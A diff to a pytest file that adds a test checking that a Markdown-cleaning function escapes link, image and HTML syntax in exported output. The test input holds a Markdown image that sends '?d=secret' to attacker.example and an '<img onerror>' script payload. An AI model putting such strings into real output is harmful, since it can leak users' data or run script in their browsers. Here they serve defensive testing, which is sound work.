@@ -1,7 +1,10 @@
 """FR-OUT-01 and FR-OUT-02: Studio outputs as Markdown (stage 3)."""
 
+import re
+
 import pytest
 
+from controlled_copy.web.markdown import clean
 from tests.conftest import corpus_file
 
 pytestmark = [pytest.mark.api, pytest.mark.stage3]
@@ -50,3 +53,11 @@ def test_tc_out_002_a_removed_output_is_not_exported(visitor):
     url, _ = briefing_url(visitor)
     visitor.client.delete(f"/sources/{visitor.sources[0]}", headers=visitor.json_headers())
     assert visitor.client.get(url).status_code == 404
+
+
+def test_tc_out_001_text_cannot_render_links_images_or_html():
+    hostile = "See ![x](https://attacker.example/?d=secret) and <img src=x onerror=alert(1)> *now*"
+    escaped = clean(hostile)
+    for char in "[]<>*":
+        assert re.search(rf"(?<!\\){re.escape(char)}", escaped) is None, f"unescaped {char!r} in {escaped}"
+    assert escaped.startswith("See !\\[x\\](https://attacker.example/?d=secret)")
